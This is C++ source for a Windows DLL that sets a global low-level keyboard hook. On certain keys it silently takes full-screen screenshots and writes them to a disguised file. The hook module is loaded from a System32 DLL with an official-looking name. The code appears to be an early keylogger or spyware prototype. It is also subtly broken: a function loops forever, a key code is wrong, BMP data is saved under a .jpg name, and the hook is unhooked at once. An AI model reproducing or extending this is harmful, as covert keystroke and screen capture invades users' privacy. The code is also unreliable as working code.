// hook.cpp : Defines the exported functions for the DLL.
//

//#include "pch.h"
//#include "framework.h"

#include "hook.h"
#include <corecrt_wstdio.h>

// This is an example of an exported variable
HOOK_API int nhook = 0;

// This is an example of an exported function.
HOOK_API DWORD fnhook(void)
{
	KEY_EVENT_RECORD key;
	DWORD t;
	while (1)
	{
		if (getconchar(key))
		{
			t = key.wVirtualKeyCode;
		}
	}

	return t;
}

HOOK_API LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	tagKBDLLHOOKSTRUCT* p = (tagKBDLLHOOKSTRUCT*)(lParam);
	WCHAR szTest[10];
	HWND hWndConsole;

	// If key is being pressed
	DWORD vk_code = p->vkCode;
	if (wParam == WM_KEYDOWN)
	{
		switch (vk_code)
		{
				// Invisible keys
			case 0x1b: {//VK_ESCAPE
				CaptureScreen();
				break;
			}
			case 0x09: //VK_TAB
			{
				CaptureScreen();
				break;
			}
			case 0x11: //VK_CONTROL
			{
				swprintf_s(szTest, 10, L"%d", fnhook());
				MessageBox(0, szTest, L"Keyboard", MB_OK);
				break;
			}
			case 0x0d://VK_RETURN
			{
				CaptureScreen();
				break;
			}
			case 0x2a: //VK_PRINT
			{
				CaptureScreen();
				break;
			}
			// Visible keys
			default:
			{
				swprintf_s(szTest, 10, L"%d", vk_code);
				MessageBox(0, szTest, L"Keyboard", MB_OK);
				break;
			}
		}

	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


HOOK_API bool getconchar(KEY_EVENT_RECORD& krec)
{
	DWORD cc;
	INPUT_RECORD irec;
	HANDLE h = GetStdHandle(STD_INPUT_HANDLE);

	if (h == NULL)
	{
		return false; // console not found
	}

	for (; ; )
	{
		ReadConsoleInput(h, &irec, 1, &cc);
		if (irec.EventType == KEY_EVENT
			&& ((KEY_EVENT_RECORD&)irec.Event).bKeyDown
			)//&& ! ((KEY_EVENT_RECORD&)irec.Event).wRepeatCount )
		{
			krec = (KEY_EVENT_RECORD&)irec.Event;

			return true;
		}
	}
	return false; //future ????
}

int CaptureScreen()
{
	HDC hdcScreen = NULL;
	HDC hdcMirrorScreen = NULL;
	HBITMAP hbmScreen = NULL;
	BITMAP bmpScreen;

	// Retrieve the handle to a display device context for the client
	// area of the window.
	hdcScreen = GetDC(NULL);


	// Create a compatible DC which is used in a BitBlt from the window DC
	hdcMirrorScreen = CreateCompatibleDC(hdcScreen);

	// Create a compatible bitmap from the Window DC
	hbmScreen = CreateCompatibleBitmap(hdcScreen, 1920, 1080);

	// Select the compatible bitmap into the compatible memory DC.
	SelectObject(hdcMirrorScreen, hbmScreen);

	// Bit block transfer into our compatible memory DC.
	BitBlt(hdcMirrorScreen,
		0, 0,
		1920, 1080,
		hdcScreen,
		0, 0,
		SRCCOPY);

	// Get the BITMAP from the HBITMAP
	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);

	BITMAPFILEHEADER   bmfHeader;
	BITMAPINFOHEADER   bi;

	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmpScreen.bmWidth;
	bi.biHeight = bmpScreen.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;

	DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

	// Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that
	// call HeapAlloc using a handle to the process's default heap. Therefore, GlobalAlloc and LocalAlloc
	// have greater overhead than HeapAlloc.
	HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
	char* lpbitmap = (char*)GlobalLock(hDIB);

	// Gets the "bits" from the bitmap and copies them into a buffer
	// which is pointed to by lpbitmap.
	GetDIBits(hdcScreen, hbmScreen, 0,
		(UINT)bmpScreen.bmHeight,
		lpbitmap,
		(BITMAPINFO*)&bi, DIB_RGB_COLORS);

	// A file is created, this is where we will save the screen capture.
	HANDLE hFileScreen = CreateFile(L"captureqwsx.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Add the size of the headers to the size of the bitmap to get the total file size
	DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	//Offset to where the actual bitmap bits start.
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);

	//Size of the file
	bmfHeader.bfSize = dwSizeofDIB;

	//bfType must always be BM for Bitmaps
	bmfHeader.bfType = 0x4D42; //BM

	DWORD dwBytesWritten = 0;
	WriteFile(hFileScreen, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(hFileScreen, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(hFileScreen, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

	//Unlock and Free the DIB from the heap
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);

	//Close the handle for the file that was created
	CloseHandle(hFileScreen);
	return 0;
}

HOOK_API int run()
{
	WCHAR szTest[10];
	HMODULE dll = LoadLibrary(L"C:\\Windows\\System32\\winlogonext.dll");

	if (dll == NULL)
	{
		MessageBox(0, L"NULL", L"hMod", MB_OKCANCEL);
	}
	//
	HHOOK handle = SetWindowsHookEx(
						WH_KEYBOARD_LL,
						HookProc,
						dll,
						0);
	if (handle==NULL)
	{
		MessageBox(0, L"NOT RUNNING...", L"WinAPI", MB_OKCANCEL);
	}
	else
	{
		UnhookWindowsHookEx(handle);
	}

	return 0;
}